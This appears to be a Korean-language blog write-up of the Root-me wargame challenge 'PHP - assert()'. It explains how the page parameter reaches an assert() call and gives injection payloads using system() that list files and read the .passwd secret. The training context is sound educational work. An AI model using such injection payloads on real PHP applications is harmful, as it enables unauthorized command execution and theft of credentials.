---
title : Root-me PHP assert()
date: 2022-06-18-21:41 +0900
categories : [Wargame, Root-me]
tags : [php assert, php assert LFI]
---

## PHP - assert()
<hr style="border-top: 1px solid;"><br>

```
Read the doc!
Author
Birdy42,  26 November 2016

Statement
Find and exploit the vulnerability to read the file .passwd.
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

home, about 등의 페이지에 접속하면 파라미터로 ```?page=home``` 처럼 값을 받는다.

값으로 ```../```을 주니 아래와 같이 assertion이 출력됬다.
: ```Warning: assert(): Assertion "strpos('includes/../.php', '..') === false" failed in /challenge/web-serveur/ch47/index.php on line 8 Detected hacking attempt!```

<br>

Bypass LFI checks and strpos() check in assert
: <a href="https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6" target="_blank">infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6</a>

<br>

위의 블로그에서 설명해준 것 처럼  ```' and die(system('ls'))or '```을 통해 우회할 수 있다.

따라서 ```' and die(system('cat .passwd'))or '```를 해주면 비밀번호가 출력된다.

<br><br>
<hr style="border: 2px solid;">
<br><br>
